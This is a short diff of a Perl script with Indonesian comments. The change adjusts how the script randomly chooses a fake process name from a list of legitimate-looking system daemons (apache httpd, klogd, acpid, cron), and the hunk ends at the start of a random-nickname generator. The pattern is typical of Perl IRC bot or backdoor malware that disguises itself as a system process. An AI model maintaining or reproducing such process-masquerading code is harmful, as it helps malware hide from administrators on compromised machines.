@@ -27,7 +27,12 @@ my @rps = ("/usr/local/apache/bin/httpd -DSSL",
            "/sbin/klogd -c 1 -x -x",
            "/usr/sbin/acpid",
            "/usr/sbin/cron");
-my $process = $rps[rand scalar @rps];
+
+# Inisialisasi generator angka acak
+srand();
+
+# Pilih nama proses secara acak
+my $process = $rps[int rand @rps];
 
 # Fungsi untuk membuat nickname acak
 sub generate_random_nick {
